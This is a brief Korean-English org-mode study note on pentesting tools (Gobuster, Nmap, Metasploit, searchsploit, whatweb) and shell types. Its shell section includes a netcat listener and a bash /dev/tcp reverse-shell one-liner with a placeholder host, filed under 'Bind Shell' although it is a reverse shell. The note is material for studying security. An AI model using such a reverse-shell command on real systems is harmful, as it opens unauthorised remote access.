
# Table of Contents

1.  [Gobuster](#org5ba2fd5)
    1.  [brute-forcing tool](#org3630185)
    2.  [dictionary-based](#orgfd59d9f)
    3.  [eg. gobuseter (directory) -u (url) -w (wordlist)](#org9d8d256)
2.  [robots.txt](#org9ad70b1)
    1.  [웹 크롤러의 정보 수집 범위를 제한하는 역할을 한다.](#orgb28f447)
3.  [Metasploit](#org233657d)
    1.  [많은 exploit들이 내장된 pentesting 도구](#org3b92f23)
4.  [Nmap](#org3385d62)
    1.  [포트스캔 도구](#orgc131b31)
5.  [searchsploit](#orgbfb0863)
    1.  [익스플로잇 검색 툴](#orgdf4f2a1)
    2.  [eg. searchsploit (application) (version)](#orgfb959bf)
6.  [Shell](#org51f4319)
    1.  [types of shell (for remote command execution)](#orgab009d9)
        1.  [Bind Shell: 공격자가 공격 대상에 쉘을 업로드하고, 연결하여 통신](#org6946722)
        2.  [Reverse Shell: 공격 대상에서 반대로 공격자쪽으로 연결하는 쉘](#org4e1d41a)
        3.  [Web Shell: 웹 서버를 이용하여 명령을 실행](#org97c4051)
7.  [whatweb](#org7725d54)
    1.  [웹서버의 버전과 간단한 정보를 출력하는 도구](#orgcb598f6)

\#-**- mode: org -**-


<a id="org5ba2fd5"></a>

# Gobuster


<a id="org3630185"></a>

## brute-forcing tool


<a id="orgfd59d9f"></a>

## dictionary-based


<a id="org9d8d256"></a>

## eg. gobuseter (directory) -u (url) -w (wordlist)


<a id="org9ad70b1"></a>

# robots.txt


<a id="orgb28f447"></a>

## 웹 크롤러의 정보 수집 범위를 제한하는 역할을 한다.


<a id="org233657d"></a>

# Metasploit


<a id="org3b92f23"></a>

## 많은 exploit들이 내장된 pentesting 도구


<a id="org3385d62"></a>

# Nmap


<a id="orgc131b31"></a>

## 포트스캔 도구


<a id="orgbfb0863"></a>

# searchsploit


<a id="orgdf4f2a1"></a>

## 익스플로잇 검색 툴


<a id="orgfb959bf"></a>

## eg. searchsploit (application) (version)


<a id="org51f4319"></a>

# Shell


<a id="orgab009d9"></a>

## types of shell (for remote command execution)


<a id="org6946722"></a>

### Bind Shell: 공격자가 공격 대상에 쉘을 업로드하고, 연결하여 통신

1.  netcat -lvnp <port>

2.  bash -c "bash -i >& *dev/tcp/host/port* 0>&1

3.  /dev/tcp/host/port 소켓을 기반으로 입출력 수행 (0>&1은 0이 1과 같은 곳으로 redirection 한다는 의미


<a id="org4e1d41a"></a>

### Reverse Shell: 공격 대상에서 반대로 공격자쪽으로 연결하는 쉘


<a id="org97c4051"></a>

### Web Shell: 웹 서버를 이용하여 명령을 실행


<a id="org7725d54"></a>

# whatweb


<a id="orgcb598f6"></a>

## 웹서버의 버전과 간단한 정보를 출력하는 도구

